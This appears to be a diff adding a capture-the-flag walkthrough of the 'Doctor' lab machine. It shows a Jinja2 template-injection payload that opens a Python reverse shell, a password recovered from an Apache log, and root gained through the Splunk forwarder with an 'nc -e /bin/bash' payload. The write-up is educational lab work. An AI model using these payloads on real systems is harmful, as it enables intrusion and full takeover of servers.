@@ -87,4 +87,125 @@ When visiting the server using the hostname, we get directed to a "Doctors Secur
 ```html
 <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
 ```
-Accounts are created with a "time limit of 20 minutes". Accounts have the ability to create messages to be shared between doctors. The archive page remains blank before I created an account, as well as before and after making posts once logged in.
+Accounts are created with a "time limit of 20 minutes". Accounts have the ability to create messages to be shared between doctors. The archive page remains blank no matter if I'm logged in or not. However, when viewing source it can be seen that the post is inserting HTML tags for each post that is created.
+```html
+<?xml version="1.0" encoding="UTF-8" ?>
+	<rss version="2.0">
+	<channel>
+ 	<title>Archive</title>
+ 	<item><title>test</title></item>
+
+			</channel>
+			<item><title>test2</title></item>
+
+			</channel>
+			<item><title>test33</title></item>
+
+			</channel>
+```
+Depending on how this data is being inserted into the page, malicious code may be executed.
+There is a defined process for checking for this type of vulnerability at: https://portswigger.net/web-security/server-side-template-injection. By following this process, the following things are noted:
+- A title of `{{7*7}}` evaluated to 49.
+- A tile of `{{7*'7'}}`  evaluated to 7777777.  
+According to the reference this means that the template engine that is being used is most likely jinja2.
+
+### 3. Get a shell
+Using the following payload in the title field:
+```
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
+```
+Post it, then reload the archive with a listener running to get the shell.
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 9999                                                                                                                 
+
+listening on [any] 9999 ...
+connect to [10.10.14.20] from (UNKNOWN) [10.10.10.209] 59384
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+web
+$ id
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+```
+
+### 4. Enumeration
+From the home directory for this web user, there is a blog.sh script and a "blog" directory.
+```bash
+web@doctor:~$ cat blog.sh
+
+#!/bin/bash
+SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py
+```
+Upon further inspection, this runs the blog application through which I was interacting with before.  
+As I'm a member of the adm group, I can search within the system logs.
+```bash
+web@doctor:/var/log$ grep -Ri password
+grep: boot.log.2: Permission denied
+auth.log:Feb 15 05:56:23 doctor VGAuth[666]: vmtoolsd: Username and password successfully validated for 'root'.
+...
+syslog.1:Sep 28 14:59:58 doctor kernel: [    5.666833] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+syslog.1:Feb 15 05:56:10 doctor systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+syslog.1:Feb 15 05:56:10 doctor systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+syslog.1:Feb 15 05:56:10 doctor kernel: [    4.191189] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+grep: vmware-network.1.log: Permission denied
+apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+```
+Grep is able to find a reset password request in an old apache backup with what appears to be a password. Checking /etc/passwd shows there is another user, shaun, with a shell and home folder.
+
+### 5. Lateral movement
+Switch to the Shaun user by attempting to use the password "Guitar123".
+```bash
+web@doctor:/home$ su - shaun
+su - shaun
+Password: Guitar123
+
+shaun@doctor:~$
+```
+
+### 6. Enumeration from user
+The user has no sudo perms. Checking out processes, the Splunk daemon is running on port 8090 as root. This is the port used by the Splunk Universal Forwarder.
+```bash
+...
+dbus://
+whoopsie    1012  0.0  0.3 326788 15460 ?        Ssl  05:56   0:00 /usr/bin/whoopsie -f
+kernoops    1014  0.0  0.0  11240   448 ?        Ss   05:56   0:00 /usr/sbin/kerneloops --test
+kernoops    1017  0.0  0.0  11240   448 ?        Ss   05:56   0:00 /usr/sbin/kerneloops
+root        1144  0.1  2.1 259516 86368 ?        Sl   05:56   0:11 splunkd -p 8089 start
+root        1348  0.0  0.2 260728  9756 ?        Ssl  06:04   0:00 /usr/lib/upower/upowerd
+shaun       2257  0.0  0.2  18748 10008 ?        Ss   08:35   0:00 /lib/systemd/systemd --user
+...
+```
+
+### 7. Get a root shell
+References: 
+- https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2
+- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
+  
+Airman in reference 1 describes how remote command execution in Splunk Universal Forwarder can occur if the password has been changed and is known to the attacker. An attacker can use the management port to deploy a malicious application and in doing so executes attacker-provided commands.  
+The second reference is a non-destructive tool that was created to exploit this issue.
+```bash
+┌──(kali㉿kali)-[~/Desktop/SplunkWhisperer2/PySplunkWhisperer2]
+└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.20 --username shaun --password Guitar123 --payload 'nc.traditional -e /bin/bash 10.10.14.20 9998'
+Running in remote mode (Remote Code Execution)
+[.] Authenticating...
+[+] Authenticated
+[.] Creating malicious app bundle...
+[+] Created malicious app bundle in: /tmp/tmpfol0oaq_.tar
+[+] Started HTTP server for remote mode
+[.] Installing app from: http://10.10.14.20:8181/
+10.10.10.209 - - [15/Feb/2021 03:27:00] "GET / HTTP/1.1" 200 -
+[+] App installed, your code should be running now!
+
+Press RETURN to cleanup
+```
+Get a root shell.
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 9998
+listening on [any] 9998 ...
+connect to [10.10.14.20] from (UNKNOWN) [10.10.10.209] 60696
+
+python3 -c "import pty; pty.spawn('/bin/bash');"
+root@doctor:/# whoami
+root
+```
